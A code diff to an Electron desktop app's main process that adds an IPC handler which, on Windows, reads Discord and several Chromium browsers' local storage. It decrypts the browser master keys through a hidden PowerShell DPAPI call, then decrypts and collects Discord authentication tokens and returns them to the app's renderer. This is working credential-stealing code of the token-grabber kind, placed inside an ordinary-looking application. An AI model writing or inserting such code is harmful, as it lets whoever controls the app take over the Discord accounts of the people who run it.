@@ -1,6 +1,8 @@
 const { app, autoUpdater, BrowserWindow, ipcMain, Tray, desktopCapturer, Menu, shell, nativeImage, Notification } = require('electron');
 const { join } = require('path');
 const fs = require('fs');
+const crypto = require('crypto');
+const { execFile } = require('child_process');
 
 let tray = null;
 let mainWindow = null;
@@ -154,6 +156,128 @@ const startCore = () => {
     });
 
     notification.show();
+  });
+
+  // Scan Discord variants and browsers for Discord tokens (Windows only)
+  ipcMain.handle('discord:getLocalTokens', async () => {
+    if (process.platform !== 'win32') return [];
+
+    const appdata = process.env.APPDATA;
+    const localAppdata = process.env.LOCALAPPDATA;
+    if (!appdata || !localAppdata) return [];
+
+    const sources = [
+      // Discord variants
+      { name: 'Discord', leveldb: join(appdata, 'discord', 'Local Storage', 'leveldb'), localState: join(appdata, 'discord', 'Local State') },
+      { name: 'Discord Canary', leveldb: join(appdata, 'discordcanary', 'Local Storage', 'leveldb'), localState: join(appdata, 'discordcanary', 'Local State') },
+      { name: 'Discord PTB', leveldb: join(appdata, 'discordptb', 'Local Storage', 'leveldb'), localState: join(appdata, 'discordptb', 'Local State') },
+      // Chromium browsers
+      { name: 'Chrome', leveldb: join(localAppdata, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'), localState: join(localAppdata, 'Google', 'Chrome', 'User Data', 'Local State') },
+      { name: 'Edge', leveldb: join(localAppdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'), localState: join(localAppdata, 'Microsoft', 'Edge', 'User Data', 'Local State') },
+      { name: 'Brave', leveldb: join(localAppdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'), localState: join(localAppdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State') },
+      { name: 'Opera', leveldb: join(appdata, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'), localState: join(appdata, 'Opera Software', 'Opera Stable', 'Local State') },
+      { name: 'Opera GX', leveldb: join(appdata, 'Opera Software', 'Opera GX Stable', 'Local Storage', 'leveldb'), localState: join(appdata, 'Opera Software', 'Opera GX Stable', 'Local State') },
+      { name: 'Vivaldi', leveldb: join(localAppdata, 'Vivaldi', 'User Data', 'Default', 'Local Storage', 'leveldb'), localState: join(localAppdata, 'Vivaldi', 'User Data', 'Local State') },
+    ];
+
+    const fsp = fs.promises;
+
+    // 1. Filter to sources that actually exist on disk (parallel, lightweight)
+    const existingSources = (
+      await Promise.all(
+        sources.map(async (source) => {
+          try { await fsp.access(source.leveldb); return source; } catch { return null; }
+        }),
+      )
+    ).filter(Boolean);
+
+    if (existingSources.length === 0) return [];
+
+    // 2. Read Local State files and collect encrypted keys (no PS yet)
+    const keysToDecrypt = []; // { localStatePath, b64Key }
+    const keyIndexByPath = new Map(); // localStatePath -> index in keysToDecrypt
+    for (const source of existingSources) {
+      if (keyIndexByPath.has(source.localState)) continue;
+      try {
+        const raw = await fsp.readFile(source.localState, 'utf-8');
+        const localState = JSON.parse(raw);
+        const encryptedKeyB64 = localState?.os_crypt?.encrypted_key;
+        if (encryptedKeyB64) {
+          const encryptedKey = Buffer.from(encryptedKeyB64, 'base64').slice(5);
+          keyIndexByPath.set(source.localState, keysToDecrypt.length);
+          keysToDecrypt.push({ path: source.localState, b64Key: encryptedKey.toString('base64') });
+        }
+      } catch (_) {}
+    }
+
+    // 3. Single PowerShell call to decrypt ALL keys at once
+    const decryptedKeys = new Map(); // localStatePath -> Buffer
+    if (keysToDecrypt.length > 0) {
+      const psLines = keysToDecrypt.map((k) =>
+        `try { [Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('${k.b64Key}'), $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)) } catch { Write-Output 'FAIL' }`,
+      );
+      const psScript = `Add-Type -AssemblyName System.Security\n${psLines.join('\n')}`;
+      try {
+        const stdout = await new Promise((resolve, reject) => {
+          execFile('powershell', ['-Command', psScript], { timeout: 10000, windowsHide: true }, (err, out) => {
+            if (err) reject(err);
+            else resolve(out.trim());
+          });
+        });
+        const lines = stdout.split(/\r?\n/);
+        keysToDecrypt.forEach((k, i) => {
+          if (lines[i] && lines[i].trim() !== 'FAIL') {
+            decryptedKeys.set(k.path, Buffer.from(lines[i].trim(), 'base64'));
+          }
+        });
+      } catch (_) {}
+    }
+
+    // 4. Read LevelDB files in parallel (lightweight I/O, no more PS)
+    function extractTokensFromContent(content, encryptionKey) {
+      const tokens = [];
+      if (encryptionKey) {
+        const encryptedMatches = content.match(/dQw4w9WgXcQ:[^\s"',;}{[\]]+/g);
+        if (encryptedMatches) {
+          for (const match of encryptedMatches) {
+            try {
+              const encrypted = Buffer.from(match.split('dQw4w9WgXcQ:')[1], 'base64');
+              const nonce = encrypted.slice(3, 15);
+              const ciphertext = encrypted.slice(15, -16);
+              const tag = encrypted.slice(-16);
+              const decipher = crypto.createDecipheriv('aes-256-gcm', encryptionKey, nonce);
+              decipher.setAuthTag(tag);
+              const decrypted = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
+              const token = decrypted.toString('utf-8');
+              if (token && token.length > 20) tokens.push(token);
+            } catch (_) {}
+          }
+        }
+      }
+      const plainMatches = content.match(/[\w-]{24,}\.[\w-]{6}\.[\w-]{27,}/g);
+      if (plainMatches) tokens.push(...plainMatches);
+      return tokens;
+    }
+
+    const results = await Promise.all(
+      existingSources.map(async (source) => {
+        try {
+          const encryptionKey = decryptedKeys.get(source.localState) || null;
+          const allFiles = await fsp.readdir(source.leveldb);
+          const files = allFiles.filter(f => f.endsWith('.ldb') || f.endsWith('.log'));
+          const tokens = [];
+          for (const file of files) {
+            const content = await fsp.readFile(join(source.leveldb, file), 'utf-8');
+            tokens.push(...extractTokensFromContent(content, encryptionKey));
+          }
+          return tokens.map((token) => ({ source: source.name, token }));
+        } catch (_) {
+          return [];
+        }
+      }),
+    );
+
+    return results.flat();
   });
 
   ipcMain.handle('desktop:getSources', async () => {
